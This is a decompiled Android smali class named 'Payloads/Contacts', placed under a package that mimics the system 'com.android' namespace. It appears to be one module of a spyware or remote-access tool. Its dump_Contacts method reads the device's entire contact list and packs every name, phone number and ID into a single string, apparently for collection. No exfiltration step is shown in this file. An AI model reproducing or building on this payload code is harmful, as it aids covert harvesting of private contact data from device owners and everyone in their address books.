.class public Lcom/android/ld/Payloads/Contacts;
.super Ljava/lang/Object;
.source "Contacts.java"


# instance fields
.field contact:Ljava/lang/String;

.field context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 14
    iput-object p1, p0, Lcom/android/ld/Payloads/Contacts;->context:Landroid/content/Context;

    .line 15
    return-void
.end method


# virtual methods
.method public dump_Contacts()Ljava/lang/String;
    .locals 11

    .line 18
    const-string v0, "content://contacts/phones"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 19
    .local v0, "Contact":Landroid/net/Uri;
    iget-object v1, p0, Lcom/android/ld/Payloads/Contacts;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    move-object v2, v0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 22
    .local v1, "cur":Landroid/database/Cursor;
    if-eqz v1, :cond_1

    :try_start_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_1

    .line 23
    const/4 v2, 0x1

    .local v2, "i":I
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v3
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v4, "\n"

    if-ge v2, v3, :cond_0

    .line 24
    :try_start_1
    invoke-static {v2}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    .line 25
    .local v3, "iterator":Ljava/lang/String;
    const-string v5, "DISPLAY_NAME"

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    .line 26
    .local v5, "name":Ljava/lang/String;
    const-string v6, "NUMBER"

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 27
    .local v6, "number":Ljava/lang/String;
    const-string v7, "NUMBER_KEY"

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 28
    .local v7, "ID":Ljava/lang/String;
    const-string v8, "[()\\s-]+"

    const-string v9, ""

    invoke-virtual {v6, v8, v9}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    move-object v6, v8

    .line 29
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "#"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\nName : "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\nNumber : "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\nID : "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 31
    .local v8, "fi":Ljava/lang/String;
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    .line 33
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v10, p0, Lcom/android/ld/Payloads/Contacts;->contact:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Lcom/android/ld/Payloads/Contacts;->contact:Ljava/lang/String;

    .line 23
    .end local v3    # "iterator":Ljava/lang/String;
    .end local v5    # "name":Ljava/lang/String;
    .end local v6    # "number":Ljava/lang/String;
    .end local v7    # "ID":Ljava/lang/String;
    .end local v8    # "fi":Ljava/lang/String;
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 36
    .end local v2    # "i":I
    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lcom/android/ld/Payloads/Contacts;->contact:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/android/ld/Payloads/Contacts;->contact:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/NullPointerException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    .line 38
    :catch_0
    move-exception v2

    .line 39
    .local v2, "npe":Ljava/lang/NullPointerException;
    const-string v3, " "

    iput-object v3, p0, Lcom/android/ld/Payloads/Contacts;->contact:Ljava/lang/String;

    goto :goto_2

    .line 41
    .end local v2    # "npe":Ljava/lang/NullPointerException;
    :cond_1
    :goto_1
    nop

    :goto_2
    iget-object v2, p0, Lcom/android/ld/Payloads/Contacts;->contact:Ljava/lang/String;

    return-object v2
.end method
